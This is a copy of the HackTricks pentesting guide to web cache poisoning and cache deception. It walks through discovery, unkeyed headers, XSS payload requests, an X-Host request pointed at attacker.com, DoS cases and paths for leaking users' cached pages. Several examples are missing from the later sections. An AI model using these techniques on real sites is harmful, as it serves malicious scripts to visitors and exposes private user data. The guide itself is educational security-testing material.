
##
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cache-deception.md
#
https://portswigger.net/daily-swig/netlify-vulnerable-to-xss-ssrf-attacks-via-cache-poisoning
#
##


Cache Poisoning and Cache Deception
☁️ HackTricks Cloud ☁️ -🐦 Twitter 🐦 - 🎙️ Twitch 🎙️ - 🎥 Youtube 🎥



Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

The difference
What is the difference between web cache poisoning and web cache deception?

In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
Cache Poisoning
The goal of poisoning the cache is to make the clients load unexpected resources partially or controlled by the attacker.
The poisoned response will only be served to users who visit the affected page while the cache is poisoned. As a result, the impact can range from non-existent to massive depending on whether the page is popular or not.

To perform a cache poisoning attack, you need first to identify unkeyed inputs (parameters not needed to appear on the cached request but that change the returned page), see how to abuse this parameter and get the response cached.

Discovery: Check HTTP headers
Usually, when a response was stored in the cache there will be a header indicating so, you can check which headers you should pay attention to in this post: HTTP Cache headers.

Discovery: Caching 400 code
If you are thinking that the response is being stored in a cache, you could try to send requests with a bad header, which should be responded to with a status code 400. Then try to access the request normally and if the response is a 400 status code, you know it's vulnerable (and you could even perform a DoS).
A badly configured header could be just \: as a header.
Note that sometimes these kinds of status codes aren't cached so this test will be useless.

Discovery: Identify and evaluate unkeyed inputs
You could use Param Miner to brute-force parameters and headers that may be changing the response of the page. For example, a page may be using the header X-Forwarded-For to indicate the client to load the script from there:

<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
Elicit a harmful response from the back-end server
With the parameter/header identified check how it is being sanitised and where is it getting reflected or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

Get the response cached
Once you have identified the page that can be abused, which parameter/header to use and how to abuse it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.
The header X-Cache in the response could be very useful as it may have the value miss when the request wasn't cached and the value hit when it is cached.
The header Cache-Control is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: Cache-Control: public, max-age=1800
Another interesting header is Vary. This header is often used to indicate additional headers that are treated as part of the cache key even if they are normally unkeyed. Therefore, if the user knows the User-Agent of the victim he is targeting, he can poison the cache for the users using that specific User-Agent.
One more header related to the cache is Age. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be careful with the headers you use because some of them could be used unexpectedly as keyed and the victim will need to use that same header. Always test a Cache Poisoning with different browsers to check if it's working.

Exploiting Examples
Easiest example
A header like X-Forwarded-For is being reflected in the response unsanitized>
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:

GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
Note that this will poison a request to /en?region=uk not to /en

Using web cache poisoning to exploit cookie-handling vulnerabilities
Cookies could also be reflected on the response of a page. If you can abuse it to cause an XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.

GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

Using multiple headers to exploit web cache poisoning vulnerabilities
Sometimes you will need to exploit several unkeyed inputs to be able to abuse a cache. For example, you may find an Open redirect if you set X-Forwarded-Host to a domain controlled by you and X-Forwarded-Scheme to http.If the server is forwarding all the HTTP requests to HTTPS and using the header X-Forwarded-Scheme as the domain name for the redirect. You can control where the page is pointed by the redirect.

GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
Exploiting with limited Varyheader
If you found that the X-Host header is being used as domain name to load a JS resource but the Vary header in the response is indicating User-Agent. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent:

GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling
Learn here about how to perform Cache Poisoning attacks by abusing HTTP Request Smuggling.

Automated testing for Web Cache Poisoning
The Web Cache Vulnerability Scanner can be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.

Example usage: wcvs -u example.com




Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

Vulnerable Examples
Apache Traffic Server (CVE-2021-27577)
ATS forwarded the fragment inside the URL without stripping it and generated the cache key only using the host, path and query (ignoring the fragment). So the request /#/../?r=javascript:alert(1) was sent to the backend as /#/../?r=javascript:alert(1) and the cache key didn't have the payload inside of it, only host, path and query.

GitHub CP-DoS
Sending a bad value in the content-type header triggered a 405 cached response. The cache key contained the cookie so it was possible only to attack unauth users.

GitLab + GCP CP-DoS
GitLab uses GCP buckets to store static content. GCP Buckets support the header x-http-method-override. So it was possible to send the header x-http-method-override: HEAD and poison the cache into returning an empty response body. It could also support the method PURGE.

Rack Middleware (Ruby on rails)
Ruby on Rails application is often deployed alongside the Rack middleware. The Rack code below takes the value of the x-forwarded-scheme value and uses it as the scheme of the request.



Sending the x-forwarded-scheme: http header would result in a 301 redirect to the same location which will cause a DoS over that resource as in this example:



The application might also support the header X-forwarded-host and redirect the user to that host, making it possible to load javascript files from the attacker server:



403 and Storage Buckets
Previously, Cloudflare used to cache the 403 responses, therefore sending bad Authorization headers trying to access S3 or Azure Storage Blobs exposed will return a 403 that will be cached. Cloudflare no longer caches 403 responses but this might work with other proxies.



Injecting Keyed Parameters
Quite often, caches are configured to only include specific GET parameters in the cache key.

For example, Fastly using Varnish cached the size parameter in the request but if you sent also the siz%65 parameter with a bad value, the cache key was constructed with the well written size param, but the backend used the value inside the URL encoded param.



URL encoding the second size parameter caused it to be ignored by the cache, but used by the backend. Giving the parameter a value of 0 would result in a cacheable 400 Bad Request.

User Agent Rules
Due to the high amount of traffic tools like FFUF or Nuclei generate, some developers decided to block requests matching their user-agents. Ironically, these tweaks can introduce unwanted cache poisoning and DoS opportunities.



I found this worked on multiple targets, with user-agents from different tools or scanners.

Illegal Header Fields
The header name format is defined in RFC7230 as follows:



In theory, if a header name contains characters other than the ones listed in tchar it should be rejected with a 400 Bad request. In practice, however, servers don't always respect the RFC. The easiest way to exploit this nuance was by targeting Akamai which doesn't reject invalid headers, but forwards them and caches any 400 error as long the cache-control header is not present.


##
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/cache-deception.md
#
##

Sending a header containing an illegal character, \ would cause a cacheable 400 Bad Request error. This was one of the most commonly identified patterns throughout my testing.

Finding new headers
https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6

Cache Deception
The goal of Cache Deception is to make clients load resources that are going to be saved by the cache with their sensitive information.

First of all note that extensions such as .css, .js, .png etc are usually configured to be saved in the cache. Therefore, if you access www.example.com/profile.php/nonexistent.js the cache will probably store the response because it sees the .js extension. But, if the application is replaying with the sensitive user contents stored in www.example.com/profile.php, you can steal those contents from other users.

Other things to test:

www.example.com/profile.php/.js
www.example.com/profile.php/.css
www.example.com/profile.php/test.js
www.example.com/profile.php/../test.js
www.example.com/profile.php/%2e%2e/test.js
Use lesser known extensions such as .avif
Another very clear example can be found in this write-up: https://hackerone.com/reports/593712.
In the example, it is explained that if you load a non-existent page like http://www.example.com/home.php/non-existent.css the content of http://www.example.com/home.php (with the user's sensitive information) is going to be returned and the cache server is going to save the result.
Then, the attacker can access http://www.example.com/home.php/non-existent.css in their own browser and observe the confidential information of the users that accessed before.

Note that the cache proxy should be configured to cache files based on the extension of the file (.css) and not base on the content-type. In the example http://www.example.com/home.php/non-existent.css will have a text/html content-type instead of a text/css mime type (which is the expected for a .css file).

Learn here about how to perform Cache Deceptions attacks abusing HTTP Request Smuggling.

References
https://portswigger.net/web-security/web-cache-poisoning
https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities
https://hackerone.com/reports/593712
https://youst.in/posts/cache-poisoning-at-scale/
https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9



Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

☁️ HackTricks Cloud ☁️ -🐦 Twitter 🐦 - 🎙️ Twitch 🎙️ - 🎥 Youtube 🎥
